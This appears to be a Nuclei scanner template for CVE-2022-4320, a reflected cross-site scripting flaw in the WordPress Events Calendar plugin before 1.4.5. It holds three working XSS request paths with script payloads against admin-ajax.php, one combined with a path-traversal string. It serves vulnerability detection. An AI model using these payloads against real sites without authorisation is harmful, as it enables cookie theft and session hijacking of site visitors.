http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - imgNavLeftXX\"><script>alert(document.cookie)</script>
    - <script>alert(document.cookie)</script>({});
    - '><script>alert(document.cookie)</script>.js'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=cdaily&subaction=cd_calendar&id=XX"><script>alert(document.cookie)</script>'
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=cdaily&subaction=cd_dismisshint&callback=<script>alert(document.cookie)</script>'
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=cdaily&subaction=cd_displayday&callback=1&bymethod=&by_id=/../../../../../../r%26_=--><script>alert(document.cookie)</script>'
  stop-at-first-match: true
id: CVE-2022-4320
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:mhsoftware:wordpress_events_calendar_plugin:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-4320
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.94424
    epss-score: 0.15457
  description: 'WordPress Events Calendar plugin before 1.4.5 contains multiple cross-site
    scripting vulnerabilities. The plugin does not sanitize and escape a parameter
    before outputting it back in the page. An attacker can inject arbitrary script
    in the browser of an unsuspecting user in the context of the affected site, which
    can allow the attacker to steal cookie-based authentication credentials and launch
    other attacks. This vulnerability can be used against both unauthenticated and
    authenticated users.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into the affected website, leading to potential data
    theft, session hijacking, or defacement.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: wordpress_events_calendar_plugin
    vendor: mhsoftware
    verified: true
  name: WordPress Events Calendar <1.4.5 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/f1244c57-d886-4a6e-8cdb-18404e8c153c
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4320
  remediation: Fixed in version 1.4.5.
  severity: medium
  tags: cve,cve2022,calendar,event,xss,wordpress,wp,wp-plugin,wpscan,mhsoftware,vuln
